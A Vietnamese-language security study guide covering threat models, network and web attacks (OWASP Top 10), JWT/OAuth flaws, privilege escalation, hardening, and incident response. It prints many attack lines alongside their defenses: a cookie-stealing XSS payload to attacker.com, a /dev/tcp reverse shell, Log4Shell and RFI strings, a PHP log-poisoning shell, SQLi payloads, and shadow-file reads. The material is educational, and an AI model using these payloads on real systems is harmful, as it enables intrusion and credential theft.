# Tổng Hợp Kiến Thức Bảo Mật & Tấn Công

> Phương pháp: What – How – Why – Components – Compare – Trade-offs – Real-world – Ghi chú

---

## 1. Security Fundamentals – Nền tảng bảo mật

### What – Security Fundamentals là gì?
Tập hợp các nguyên tắc, mô hình và khái niệm cốt lõi làm nền tảng cho mọi lĩnh vực bảo mật thông tin.

### How – CIA Triad

```
CIA Triad:
┌─────────────────────────────────────────────────────────┐
│  Confidentiality (Bí mật)                              │
│  → Dữ liệu chỉ được truy cập bởi người được phép      │
│  → Biện pháp: Encryption, Access Control, Auth         │
│                                                         │
│  Integrity (Toàn vẹn)                                  │
│  → Dữ liệu không bị thay đổi trái phép                │
│  → Biện pháp: Hash, Digital Signature, Checksum        │
│                                                         │
│  Availability (Khả dụng)                               │
│  → Hệ thống hoạt động khi cần                         │
│  → Biện pháp: Redundancy, Backup, DDoS protection      │
└─────────────────────────────────────────────────────────┘

Mở rộng thành STRIDE (Microsoft threat model):
S - Spoofing      → giả mạo danh tính       (vi phạm Authentication)
T - Tampering     → sửa đổi dữ liệu         (vi phạm Integrity)
R - Repudiation   → phủ nhận hành động      (vi phạm Non-repudiation)
I - Information Disclosure → lộ thông tin   (vi phạm Confidentiality)
D - Denial of Service      → từ chối dịch vụ(vi phạm Availability)
E - Elevation of Privilege → leo thang quyền(vi phạm Authorization)
```

### How – Attack Surface & Threat Modeling

```
Attack Surface:
├── Network surface   : open ports, protocols, services
├── Software surface  : APIs, web apps, binaries
├── Human surface     : phishing, social engineering
└── Physical surface  : hardware access, USB attacks

Threat Modeling (PASTA / STRIDE):
1. Define scope (what are we protecting?)
2. Identify assets (data, services, credentials)
3. Enumerate attack vectors (how can attacker reach assets?)
4. Rate risk = Likelihood × Impact
5. Mitigation controls per threat

Risk Formula:
Risk = Threat × Vulnerability × Asset Value
```

### How – Hacker Taxonomy

```
White Hat  → Ethical hacker, có phép, tìm lỗ hổng để vá
Grey Hat   → Không có phép nhưng không gây hại, thường báo cáo
Black Hat  → Tấn công trái phép, vì lợi ích cá nhân / phá hoại
Script Kiddie → Dùng tools có sẵn, không hiểu sâu
Hacktivist → Tấn công vì mục đích chính trị / xã hội
APT Group  → Advanced Persistent Threat, nhà nước bảo trợ, rất tinh vi
```

### How – Penetration Testing Phases (PTES / OWASP Testing Guide)

```
Phase 1: Reconnaissance (Thu thập thông tin)
  Passive: OSINT, WHOIS, DNS, LinkedIn, Shodan
  Active:  Port scan, banner grab, service enum

Phase 2: Scanning & Enumeration
  Network: Nmap, Masscan
  Vuln:    Nessus, OpenVAS, Nikto

Phase 3: Exploitation
  Dùng lỗ hổng tìm được để vào hệ thống

Phase 4: Post-Exploitation
  Privilege escalation, lateral movement, persistence

Phase 5: Reporting
  PoC (Proof of Concept), CVSS score, remediation steps
```

### Why – Tại sao cần học bảo mật?
- **Defensive**: hiểu attacker để build stronger defenses
- **Career**: Security Engineer, Pentester, SOC Analyst, CISO
- **Compliance**: PCI-DSS, HIPAA, ISO 27001, SOC 2 yêu cầu security controls
- **Legal**: Bug Bounty programs (HackerOne, Bugcrowd) trả tiền hợp pháp

### Real-world Usage
```bash
# OSINT: thu thập thông tin thụ động
whois target.com
dig target.com ANY
nslookup -type=MX target.com

# Subdomain enumeration (passive)
subfinder -d target.com
amass enum -passive -d target.com

# Shodan CLI
shodan search "org:Target Corp" --fields ip_str,port,org
```

---

## 2. Network Attacks – Tấn công mạng

### What – Network Attacks là gì?
Các kỹ thuật tấn công khai thác lỗ hổng trong giao thức mạng (TCP/IP, ARP, DNS, HTTP) để nghe lén, giả mạo hoặc làm gián đoạn dịch vụ.

### How – Reconnaissance với Nmap

```bash
# Basic scan
nmap -sV -sC 192.168.1.0/24        # service version + default scripts
nmap -O 192.168.1.1                 # OS detection
nmap -p- 192.168.1.1                # all 65535 ports
nmap -sU -p 53,67,68,161 192.168.1.1  # UDP scan

# Stealth scan (SYN scan)
nmap -sS -T2 192.168.1.1            # half-open, ít bị log hơn

# Script scan
nmap --script=http-headers,http-methods 192.168.1.1 -p 80,443
nmap --script vuln 192.168.1.1      # check common vulns

# Output
nmap -oX scan.xml -oN scan.txt 192.168.1.0/24
```

### How – ARP Poisoning / MITM

```
ARP Poisoning:
┌──────────┐     ARP: "192.168.1.1 is at AA:BB:CC"    ┌─────────┐
│  Victim  │ ←────────────────────────────────────── │Attacker │
│ (Client) │                                          │         │
│          │ → traffic đến router → qua attacker →   │         │
└──────────┘                                          └─────────┘
                                                           ↕
                                                      ┌─────────┐
                                                      │ Router  │
                                                      └─────────┘
Tất cả traffic của victim đi qua attacker → có thể:
- Đọc nội dung (nếu không encrypt)
- Inject payload
- Capture credentials

Phòng thủ:
- Static ARP entries cho gateway
- Dynamic ARP Inspection (DAI) trên switch
- HTTPS / TLS everywhere
- VPN
```

```bash
# ARP Poisoning với arpspoof (chỉ dùng trong lab có phép)
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Poison victim và gateway
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1    # nói với victim: tôi là gateway
arpspoof -i eth0 -t 192.168.1.1 192.168.1.100    # nói với gateway: tôi là victim

# Capture với Wireshark hoặc tcpdump
tcpdump -i eth0 -w capture.pcap
```

### How – DNS Attacks

```
DNS Spoofing / Cache Poisoning:
1. Attacker gửi forged DNS response trước legitimate server
2. DNS cache lưu response giả
3. User truy cập fake site (giống real site)

DNS Rebinding:
1. Attacker control DNS → resolve A.com → attacker IP (ngắn TTL)
2. Browser fetch trang từ A.com (attacker IP)
3. JS đang chạy → A.com DNS thay thành internal IP (10.0.0.1)
4. Vượt qua Same-Origin Policy → tấn công internal network từ browser

DNS Zone Transfer:
→ Nếu server cấu hình sai, lộ toàn bộ DNS records
```

```bash
# DNS enumeration
nslookup -type=ANY target.com
dig target.com ANY +noall +answer

# Zone transfer attempt
dig axfr @ns1.target.com target.com

# DNS brute force
dnsx -d target.com -w wordlist.txt
gobuster dns -d target.com -w subdomains.txt

# Phòng thủ: disable zone transfer, DNSSEC, DNS over HTTPS
```

### How – DoS / DDoS

```
DoS Types:
├── Volumetric    : flood băng thông (UDP flood, ICMP flood, DNS amplification)
├── Protocol      : khai thác giao thức (SYN flood, Ping of Death, Smurf)
└── Application   : khai thác app layer (HTTP flood, Slowloris, ReDoS)

SYN Flood:
Client gửi SYN → Server tạo half-open connection → chiếm buffer
Attacker gửi hàng triệu SYN (spoofed IP) → buffer full → từ chối kết nối mới

Phòng thủ:
- SYN Cookies: server không lưu state cho half-open connections
- Rate limiting (iptables, nginx limit_req)
- CDN / WAF (Cloudflare, AWS Shield)
- Anycast network diffusion
```

### Compare – Passive vs Active Reconnaissance

| | Passive Recon | Active Recon |
|--|---------------|-------------|
| **Interaction với target** | Không | Có |
| **Bị phát hiện** | Khó | Dễ hơn |
| **Nguồn** | OSINT, public records | Port scan, banner grab |
| **Ví dụ** | WHOIS, Google dorking | Nmap, Nikto |

---

## 3. Web Attacks – OWASP Top 10

### What – OWASP Top 10 là gì?
OWASP (Open Web Application Security Project) Top 10 là danh sách 10 lỗ hổng web phổ biến và nguy hiểm nhất, cập nhật định kỳ. Tiêu chuẩn đầu tiên trong web security.

### How – A01: SQL Injection

```sql
-- Lỗ hổng: concat input trực tiếp vào SQL
SELECT * FROM users WHERE username='$input' AND password='$pass'

-- Attack: input = admin' --
SELECT * FROM users WHERE username='admin' --' AND password='...'
-- → comment out password check → login as admin

-- Attack: Union-based
' UNION SELECT username,password,null FROM users --

-- Attack: Blind SQLi (time-based)
'; IF (1=1) WAITFOR DELAY '0:0:5' --
-- → nếu delay 5s → query chạy được → database exist

-- Attack: Error-based
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()))) --

-- Phòng thủ:
-- 1. Prepared Statements (Parameterized Queries)
PreparedStatement stmt = conn.prepareStatement(
    "SELECT * FROM users WHERE username=? AND password=?"
);
stmt.setString(1, username);
stmt.setString(2, password);

-- 2. ORM (Hibernate, JPA) → tự parameterize
-- 3. Input validation + whitelist
-- 4. Least privilege DB account
-- 5. WAF rules
```

```bash
# SQLMap: automated SQL injection testing (chỉ trên authorized targets)
sqlmap -u "http://target.com/search?q=test" --dbs      # list databases
sqlmap -u "http://target.com/search?q=test" -D mydb --tables  # list tables
sqlmap -u "http://target.com/search?q=test" -D mydb -T users --dump  # dump table

# POST request
sqlmap -u "http://target.com/login" --data="user=test&pass=test" --dbs
```

### How – A02: Cryptographic Failures

```
Lỗi mã hóa phổ biến:
├── Dùng MD5/SHA1 cho passwords → rainbow table attack
├── Không dùng salt → cùng password → cùng hash
├── Self-signed cert, cert hết hạn, weak cipher (RC4, DES)
├── HTTP (not HTTPS) → plaintext credentials
├── Lưu private key trong code/repo
└── ECB mode trong AES → pattern leakage

Phòng thủ:
├── Passwords: bcrypt, scrypt, Argon2 (có cost factor)
├── Data at rest: AES-256-GCM
├── Data in transit: TLS 1.2+, disable weak ciphers
└── Key management: HSM, AWS KMS, HashiCorp Vault
```

```bash
# Check SSL/TLS configuration
sslyze target.com
testssl.sh target.com    # check cipher suites, protocols, vulnerabilities

# Check certificate
openssl s_client -connect target.com:443 | openssl x509 -noout -text

# Crack weak password hash (educational)
hashcat -m 0 hash.txt wordlist.txt        # MD5
hashcat -m 3200 hash.txt wordlist.txt     # bcrypt (cực chậm → đúng design)

# Generate secure password hash
python3 -c "import bcrypt; print(bcrypt.hashpw(b'password', bcrypt.gensalt(12)))"
```

### How – A03: Injection (XSS)

```html
<!-- Reflected XSS: input phản chiếu ngay lập tức -->
<!-- URL: http://target.com/search?q=<script>alert(1)</script> -->
<p>Kết quả tìm kiếm cho: <script>alert(1)</script></p>

<!-- Stored XSS: lưu vào DB, hiện với tất cả users -->
<!-- Comment: <script>fetch('https://attacker.com/?c='+document.cookie)</script> -->
<!-- → steal cookies của mọi user xem comment này -->

<!-- DOM-based XSS: thao túng DOM không qua server -->
<script>
  // Vulnerable code:
  document.getElementById('output').innerHTML = location.hash.slice(1);
  // URL: http://target.com/#<img src=x onerror=alert(1)>
</script>

<!-- Bypass filters: -->
<ScRiPt>alert(1)</sCrIpT>                    <!-- case variation -->
<img src=x onerror=alert(1)>                  <!-- event handler -->
<svg onload=alert(1)>                         <!-- SVG -->
javascript:alert(1)                           <!-- URL scheme -->
<a href="data:text/html,<script>alert(1)</script>">click</a>

<!-- Phòng thủ: -->
<!-- 1. Output encoding: & → &amp;  < → &lt;  > → &gt; -->
<!-- 2. Content Security Policy (CSP) header -->
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123'
<!-- 3. HttpOnly cookie flag -->
<!-- 4. DOMPurify cho rich text -->
```

### How – A04: Insecure Design / A01 Broken Access Control

```
IDOR (Insecure Direct Object Reference):
GET /api/orders/12345         → xem order của user mình
GET /api/orders/12346         → xem order của user khác? 
                                → nếu server không check ownership = IDOR

Path Traversal:
GET /download?file=report.pdf
GET /download?file=../../../../etc/passwd    → đọc system files

File Upload:
Upload file.php.jpg → rename thành file.php → execute
Upload shell.svg chứa JS → XSS

Phòng thủ:
- Check ownership trên mọi resource access
- Dùng UUID thay sequential ID
- Whitelist file extensions + validate MIME type
- Store uploads ngoài web root
```

### How – A07: Authentication Failures

```
Brute Force Attack:
for password in wordlist:
    try login(user, password)
    → nếu HTTP 200 → thành công

Phòng thủ:
- Rate limiting: max 5 attempts / 15 phút
- Account lockout + CAPTCHA sau N lần fail
- Multi-Factor Authentication (MFA/TOTP)
- Notify user khi login từ new device/location

Credential Stuffing:
→ Dùng leaked credentials từ breach databases
→ Thử trên nhiều sites khác
→ Phòng thủ: kiểm tra password có trong HaveIBeenPwned không

Session Hijacking:
→ Steal session cookie (XSS, network sniffing)
→ Phòng thủ: Secure + HttpOnly + SameSite cookie flags
             Regenerate session ID sau login
             Short session timeout
```

### How – A08: Software & Data Integrity Failures (Supply Chain)

```
Dependency Confusion / Typosquatting:
→ Publish malicious package với tên gần giống package thật
→ npm install lodash vs lodashs (typo)
→ Internal package name leaked → attacker publishes public version with same name

Phòng thủ:
- Lock file (package-lock.json, go.sum)
- SCA scan: Snyk, OWASP Dependency-Check
- Private registry, namespace packages
- Verify checksums / signatures

Log4Shell (CVE-2021-44228):
→ Input: ${jndi:ldap://attacker.com/exploit}
→ Log4j2 expand JNDI lookup → download và execute remote class
→ RCE từ bất kỳ logged input
→ Ảnh hưởng hàng triệu Java applications

Phòng thủ: upgrade Log4j2 >= 2.17.1
```

### How – A10: SSRF (Server-Side Request Forgery)

```
SSRF:
1. App nhận URL từ user rồi fetch từ server: ?url=http://example.com
2. Attacker đổi thành: ?url=http://169.254.169.254/latest/meta-data/
   → đây là AWS IMDS (metadata service) → lộ IAM credentials!
3. Hoặc: ?url=http://internal-database:5432/
   → scan internal services

Real-world: Capital One breach 2019 dùng SSRF → steal AWS credentials

Bypass techniques:
http://[::1]/           → IPv6 localhost
http://0/               → 0.0.0.0
http://127.0.0.1.nip.io/  → DNS resolve thành 127.0.0.1

Phòng thủ:
- Whitelist allowed domains / IPs
- Block private IP ranges (10.x, 172.16.x, 192.168.x, 169.254.x)
- Disable redirects
- IMDSv2 (require session token cho AWS metadata)
```

---

## 4. Authentication & Session Security

### What – Authentication Security là gì?
Bảo vệ cơ chế xác thực khỏi bị bypass, brute force, và token theft.

### How – JWT Attacks

```
JWT Structure: header.payload.signature
Ví dụ: eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.xxx

Attack 1: Algorithm None
header: {"alg": "none"}
payload: {"user": "admin", "role": "superadmin"}
signature: (remove entirely)
→ Server không verify signature → accept forged token

Attack 2: Algorithm Confusion (RS256 → HS256)
Server dùng RS256 (private key sign, public key verify)
Attacker đổi header sang HS256, sign bằng public key (public!)
Server nhìn thấy HS256 → verify bằng public key đang có → accepted!

Attack 3: Weak secret brute force
jwt_tool.py <token> --crack -d /usr/share/wordlists/rockyou.txt
hashcat -m 16500 jwt.txt wordlist.txt

Phòng thủ:
- Verify alg explicitly (whitelist RS256 hoặc HS256, không accept "none")
- Use strong random secret (>= 256 bits)
- Short expiry (15-30 phút) + refresh token rotation
- Revocation list (JWT ID blacklist) cho logout
```

### How – OAuth 2.0 Attacks

```
Authorization Code Interception:
redirect_uri=https://attacker.com    → code gửi về attacker

PKCE Bypass (Open Redirect):
/redirect?url=https://trusted.com/../evil.com
→ bypass redirect_uri whitelist check

Token Leakage in Referrer:
URL: /callback?access_token=xxx  → access_token trong URL
→ lộ qua Referer header, server logs, browser history

Phòng thủ:
- Strict redirect_uri matching (exact, not prefix)
- PKCE cho public clients
- Token trong body/header, KHÔNG trong URL
- State parameter chống CSRF
```

---

## 5. Cryptography – Mã hóa

### What – Cryptography là gì?
Khoa học bảo mật thông tin bằng cách biến đổi dữ liệu để chỉ người có key mới đọc được.

### How – Symmetric vs Asymmetric

```
Symmetric Encryption (cùng 1 key):
+ Nhanh (AES: hardware accelerated)
- Vấn đề phân phối key
Thuật toán: AES-128/256 (GCM mode), ChaCha20-Poly1305

Asymmetric Encryption (public/private key pair):
+ Giải quyết key distribution
- Chậm hơn
Thuật toán: RSA-2048/4096, ECDSA, Ed25519
Dùng cho: TLS handshake, code signing, email (PGP)

Hybrid Encryption (thực tế):
→ Asymmetric để exchange symmetric key
→ Symmetric để encrypt data (nhanh)
→ Ví dụ: TLS 1.3

Hashing (one-way):
MD5 (128-bit)   → BROKEN (collision attacks)
SHA-1 (160-bit) → BROKEN
SHA-256         → Dùng được
SHA-3           → Mới, an toàn
BLAKE3          → Nhanh nhất, modern

Password Hashing:
bcrypt   → có cost factor, chậm intentionally
scrypt   → memory-hard, chống GPU attacks
Argon2id → winner của Password Hashing Competition, tốt nhất
```

### How – TLS/SSL Deep Dive

```
TLS 1.3 Handshake (simplified):
Client → ServerHello, ClientHello (supported ciphers)
Server → Certificate, key_share (ECDH)
Client → Finished (verify cert, compute session keys)
→ Chỉ 1 round-trip (1-RTT), TLS 1.2 cần 2-RTT

TLS Vulnerabilities:
├── POODLE: SSLv3, CBC padding oracle
├── BEAST: TLS 1.0, CBC
├── HEARTBLEED: OpenSSL bug → đọc server memory
├── DROWN: SSLv2 cross-protocol attack
└── ROBOT: RSA PKCS#1 v1.5 timing attack

Certificate Pinning:
→ App chỉ trust specific cert/public key hash
→ Ngăn MITM ngay cả khi attacker có trusted CA cert
→ Bypass: Frida, sslstrip, custom CA

HSTS (HTTP Strict Transport Security):
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
→ Browser KHÔNG cho HTTP connection, chỉ HTTPS
```

---

## 6. Privilege Escalation & Post-Exploitation

### What – Privilege Escalation là gì?
Sau khi có initial access (user thường), attacker tìm cách leo thang lên root/admin để kiểm soát hoàn toàn hệ thống.

### How – Linux Privilege Escalation

```bash
# Enumeration sau khi có shell
id && whoami
uname -a                          # kernel version → check kernel exploits
cat /etc/passwd && cat /etc/shadow
sudo -l                           # gì có thể chạy với sudo?
find / -perm -u=s -type f 2>/dev/null  # SUID binaries
find / -writable -type f 2>/dev/null   # writable files
crontab -l && cat /etc/crontab    # scheduled tasks
env && cat ~/.bash_history        # environment variables, history
ps aux                            # running processes
netstat -tulpn / ss -tulpn        # listening services
cat /etc/sudoers                  # sudo rules

# Common escalation paths:
# 1. Sudo misconfiguration
sudo -l → (ALL) NOPASSWD: /usr/bin/vim
sudo vim -c ':!bash'             → root shell

# 2. SUID binary abuse
find / -perm -u=s 2>/dev/null | grep -v "proc"
# GTFOBins: https://gtfobins.github.io/
# cp với SUID → copy /etc/passwd để thêm root user

# 3. Weak file permissions
ls -la /etc/shadow               → nếu world-readable → crack passwords
ls -la /etc/sudoers              → nếu writable → add to sudoers

# 4. Cronjob abuse
# /etc/cron.d/backup: * * * * * root /opt/backup.sh
# Nếu /opt/backup.sh writable → thêm reverse shell

# 5. Kernel exploits
uname -r → 3.x.x → tìm CVE → compile exploit
searchsploit linux kernel 3.     # searchsploit từ Exploit-DB

# LinPEAS: automated enumeration
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

### How – Windows Privilege Escalation

```powershell
# Enumeration
whoami /all                        # privileges, group memberships
net user administrator             # admin account info
systeminfo                         # OS version, patches
wmic qfe list                      # installed patches
sc query                           # running services
tasklist /svc                      # processes
reg query HKLM\Software\Policies  # group policies

# Common escalation paths:
# 1. AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# → nếu = 1 → MSI files chạy với SYSTEM

# 2. Unquoted Service Path
# C:\Program Files\My App\service.exe
# Attacker tạo C:\Program.exe → chạy khi service restart

# 3. Weak Service Permissions
sc qc "VulnService"
# → binpath writable → thay bằng malicious binary

# 4. Token Impersonation (PrintSpoofer, JuicyPotato)
# SeImpersonatePrivilege → impersonate SYSTEM token

# WinPEAS
.\winPEAS.exe                     # automated Windows enumeration
```

---

## 7. Web Application Penetration Testing

### What – Web Pentesting là gì?
Kiểm thử có hệ thống để phát hiện lỗ hổng trong web applications theo phương pháp OWASP Testing Guide.

### How – Burp Suite Workflow

```
Burp Suite Proxy Flow:
Browser → Burp Proxy → Target Server
                ↓
    Intercept, modify, replay requests

Key Features:
├── Proxy: intercept & modify HTTP/S
├── Repeater: manually craft & resend requests
├── Intruder: fuzzing, brute force, payload injection
├── Scanner: automated vulnerability scanner (Pro)
├── Decoder: encode/decode base64, URL, hex
└── Collaborator: out-of-band testing (DNS, HTTP callbacks)

Testing Checklist:
□ Authentication: brute force, default credentials
□ Authorization: IDOR, privilege escalation
□ Input validation: SQLi, XSS, Command injection
□ File upload: extension bypass, MIME type
□ Session management: cookie flags, fixation
□ Business logic: negative amounts, race conditions
□ Cryptography: weak algo, improper implementation
□ Information disclosure: error messages, debug pages
```

### How – Command Injection

```bash
# Vulnerable PHP:
# system("ping " . $_GET['host']);
# Input: 8.8.8.8; id
# → ping 8.8.8.8; id → executed: id returns www-data

# Bypass techniques:
8.8.8.8; id                        # semicolon
8.8.8.8 && id                      # AND (chỉ chạy nếu ping success)
8.8.8.8 || id                      # OR (chạy nếu ping fail)
8.8.8.8 | id                       # pipe
$(id)                              # command substitution
`id`                               # backtick

# Filter bypass:
# Filter semicolon → dùng %0a (newline)
# Filter spaces → ${IFS}, $IFS, {id}

# Reverse shell payload:
bash+-c+'bash+-i+>&+/dev/tcp/10.0.0.1/4444+0>&1'

# Phòng thủ:
# - Không dùng shell functions để run external commands
# - Dùng language APIs (Java ProcessBuilder với args[], không shell=true)
# - Input validation: whitelist allowed characters
# - Principle of least privilege cho web process user
```

### How – Directory Traversal & LFI/RFI

```bash
# LFI (Local File Inclusion):
# GET /page?file=about.php
# GET /page?file=../../../../etc/passwd

# Bypass:
../../../etc/passwd%00         # null byte (PHP < 5.3)
....//....//etc/passwd         # double dot bypass
%2e%2e%2f%2e%2e%2fetc%2fpasswd # URL encoding

# LFI to RCE:
# Log poisoning: User-Agent: <?php system($_GET['cmd']); ?>
# → GET /page?file=../../../../var/log/apache2/access.log&cmd=id

# /proc/self/environ
# PHP session files /var/lib/php/sessions/
# SSH authorized_keys

# RFI (Remote File Inclusion) - PHP allow_url_include=On:
# GET /page?file=http://attacker.com/shell.php

# Gobuster: directory bruteforce
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
gobuster dir -u http://target.com -x php,html,txt -w wordlist.txt

# ffuf: fast web fuzzer
ffuf -u http://target.com/FUZZ -w wordlist.txt -mc 200,301,302
```

---

## 8. Infrastructure & Cloud Security

### What – Infrastructure Security là gì?
Bảo vệ servers, networks, cloud environments khỏi unauthorized access và misconfigurations.

### How – Linux Server Hardening

```bash
# 1. SSH Hardening (/etc/ssh/sshd_config)
PermitRootLogin no
PasswordAuthentication no          # chỉ SSH key
PubkeyAuthentication yes
AllowUsers deploy admin            # whitelist users
MaxAuthTries 3
LoginGraceTime 30
X11Forwarding no
AllowTcpForwarding no
Port 2222                          # non-standard port (security by obscurity)

# 2. Firewall (UFW/iptables)
ufw default deny incoming
ufw allow from 10.0.0.0/8 to any port 22  # SSH chỉ từ internal
ufw allow 80,443/tcp               # web
ufw enable

# iptables rules
iptables -A INPUT -p tcp --dport 22 -s 10.0.0.0/8 -j ACCEPT
iptables -A INPUT -p tcp --dport 22 -j DROP

# 3. Fail2ban: auto-ban IP sau nhiều lần fail
apt install fail2ban
# /etc/fail2ban/jail.conf:
[sshd]
enabled = true
maxretry = 3
bantime = 3600
findtime = 600

# 4. Auditd: system call auditing
auditctl -w /etc/passwd -p rwxa -k passwd_changes
auditctl -w /etc/shadow -p rwxa -k shadow_changes
ausearch -k passwd_changes

# 5. File integrity monitoring
# AIDE (Advanced Intrusion Detection Environment)
aide --init                        # tạo baseline database
aide --check                       # so sánh với baseline
```

### How – Cloud Security (AWS)

```bash
# IAM Security
# 1. Principle of least privilege
aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::123:role/MyRole \
  --action-names s3:GetObject

# 2. Check overly permissive policies
aws iam list-attached-role-policies --role-name MyRole
# Tránh: arn:aws:iam::aws:policy/AdministratorAccess
# Tránh: "Action": "*", "Resource": "*"

# 3. MFA cho root và IAM users
aws iam get-account-summary | jq '.AccountMFAEnabled'

# 4. CloudTrail: audit all API calls
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=DeleteBucket

# 5. S3 Security
# Check public buckets
aws s3api list-buckets --query 'Buckets[].Name' --output text | \
  xargs -I{} aws s3api get-bucket-acl --bucket {}

# Block all public access
aws s3api put-public-access-block --bucket mybucket \
  --public-access-block-configuration BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true

# 6. AWS Security Hub: centralized security findings
aws securityhub enable-security-hub
aws securityhub get-findings --filters '{"RecordState":[{"Value":"ACTIVE","Comparison":"EQUALS"}]}'

# 7. GuardDuty: threat detection
aws guardduty list-findings --detector-id xxx
```

---

## 9. Defensive Security – Phòng thủ

### What – Defensive Security là gì?
Tổng thể các biện pháp kỹ thuật và quy trình để phát hiện, ngăn chặn và ứng phó với tấn công.

### How – Security Operations (SOC / SIEM)

```
SIEM (Security Information and Event Management):
→ Thu thập logs từ mọi nguồn → correlate → detect threats

Log Sources:
├── Firewall logs (allowed/denied connections)
├── Authentication logs (login success/failure)
├── DNS logs (domains resolved)
├── Web server logs (HTTP requests)
├── EDR logs (endpoint events)
└── Cloud audit logs (CloudTrail, GCP Audit)

Detection Rules (Sigma / YARA):
title: Brute Force Authentication Attempt
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4625              # Failed logon
  timeframe: 5m
  condition: selection | count() by TargetUserName > 10
fields:
  - TargetUserName
  - IpAddress
level: high

MITRE ATT&CK Framework:
→ Taxonomy của TTPs (Tactics, Techniques, Procedures)
→ Map detections to ATT&CK techniques
→ TA0001: Initial Access → T1566.001: Spearphishing
→ TA0004: Privilege Escalation → T1548.003: Sudo/Sudo Caching
```

### How – Incident Response

```
IR Phases (NIST SP 800-61):
1. Preparation: playbooks, tools, training
2. Detection & Analysis: identify, scope, triage
3. Containment: isolate affected systems
4. Eradication: remove malware, patch vuln
5. Recovery: restore services, monitor
6. Post-Incident: lessons learned, update defenses

Forensics Checklist:
□ Preserve volatile data (RAM, network connections): date +%s > timestamp
□ Memory dump: volatility / LiME module
□ Disk image: dd if=/dev/sda of=disk.img bs=4M
□ Hash artifacts: sha256sum disk.img > disk.img.sha256
□ Timeline analysis: log2timeline (plaso)
□ Chain of custody: document every action

Network Forensics:
tcpdump -i eth0 -w capture.pcap    # capture traffic
wireshark capture.pcap             # analyze
zeek -r capture.pcap               # protocol analysis, conn log
```

### How – DevSecOps Pipeline

```yaml
# CI/CD Security Pipeline
stages:
  - secret-scan       # trước khi commit lên repo
  - sast              # static analysis source code
  - dependency-scan   # SCA - known CVEs
  - build
  - container-scan    # scan Docker image
  - dast              # dynamic testing
  - deploy

# 1. Secret Scanning
- name: Detect secrets
  run: |
    gitleaks detect --source . --report-format json
    truffleHog filesystem . --json

# 2. SAST
- name: Static Analysis
  run: |
    semgrep --config=auto src/      # language-agnostic
    sonarqube-scanner               # SonarQube
    bandit -r src/ -f json          # Python specific

# 3. Dependency Scan (SCA)
- name: Dependency vulnerabilities
  run: |
    snyk test --severity-threshold=high
    owasp-dependency-check --scan pom.xml --format JSON

# 4. Container Scan
- name: Scan Docker image
  run: |
    trivy image myapp:latest --exit-code 1 --severity HIGH,CRITICAL
    grype myapp:latest

# 5. DAST
- name: Dynamic Testing
  run: |
    zap-baseline.py -t http://staging.myapp.com -J report.json
```

---

## 10. Security Tools & Resources

### How – Essential Security Tools

```bash
# === Reconnaissance ===
nmap              # network scanner
masscan           # fast port scanner
subfinder/amass   # subdomain enumeration
shodan            # internet device search
theHarvester      # email, domain info

# === Web Testing ===
burp suite        # web proxy, scanner
sqlmap            # SQL injection automation
nikto             # web vulnerability scanner
gobuster/ffuf     # directory/file brute force
wfuzz             # web fuzzer

# === Exploitation ===
metasploit        # exploitation framework
searchsploit      # local exploit-db search
msfvenom          # payload generation

# === Post-Exploitation ===
linpeas/winpeas   # privilege escalation enum
mimikatz          # Windows credential extraction (Windows)
bloodhound        # Active Directory attack paths

# === Password ===
hashcat           # GPU password cracking
john (John the Ripper) # CPU password cracking
hydra             # online brute force

# === Network ===
wireshark         # packet analysis
tcpdump           # CLI packet capture
arpspoof          # ARP poisoning
responder         # LLMNR/NBT-NS poisoning

# === Defensive ===
snort/suricata    # IDS/IPS
ossec/wazuh       # host-based IDS
zeek              # network analysis
velociraptor      # endpoint detection & response
```

### Compare – Attack Categories

| Category | OWASP | CVE/CWE | MITRE ATT&CK |
|----------|-------|---------|--------------|
| **Scope** | Web apps | Any software | All attack techniques |
| **Format** | Top 10 list | Individual vuln | Tactics & Techniques |
| **Use case** | Dev/pentest | Vuln mgmt | Detection/hunting |
| **Update** | Yearly | Real-time | Yearly |

### Trade-offs
- Automation (scanners): nhanh nhưng false positives nhiều; manual testing cần thiết cho logic flaws
- Depth vs Breadth: pentest time-boxed → ưu tiên high-impact vulns (OWASP Top 10)
- Defense in depth: nhiều lớp bảo vệ → khó pass qua hết nhưng tăng complexity và cost
- Zero-day vs Known CVE: patch known vulns trước; zero-days hiếm và expensive hơn nhiều

### Real-world Usage
```bash
# Bug Bounty workflow:
# 1. Recon: subfinder + amass + httpx (filter alive hosts)
subfinder -d target.com | httpx -status-code -title | tee alive.txt

# 2. JavaScript analysis: tìm API endpoints, secrets
katana -u https://target.com | grep "api\|token\|key\|secret"
gau target.com | grep "\.js$" | sort -u

# 3. Nuclei: fast vuln scanning với templates community
nuclei -u https://target.com -t ~/nuclei-templates/ -severity high,critical

# 4. Báo cáo: CVSS score
# CVSS 3.1 Calculator: https://www.first.org/cvss/calculator/3.1
# Critical: 9.0-10.0
# High:     7.0-8.9
# Medium:   4.0-6.9
# Low:      0.1-3.9
```

### Ghi chú – Chủ đề tiếp theo
> Network Attacks Deep – ARP/DNS spoofing chi tiết, Wireshark analysis, Metasploit framework
> Web Security Deep – OWASP Top 10 từng loại, Burp Suite workflow, CTF write-up patterns
> Cryptography Deep – PKI, TLS internals, nhóm tấn công mã hóa cổ điển
> Active Directory – Kerberoasting, Pass-the-Hash, BloodHound, domain escalation
> Cloud Security – AWS/GCP/Azure attack & defense, misconfiguration hunting

---

*Cập nhật lần cuối: 2026-05-06*
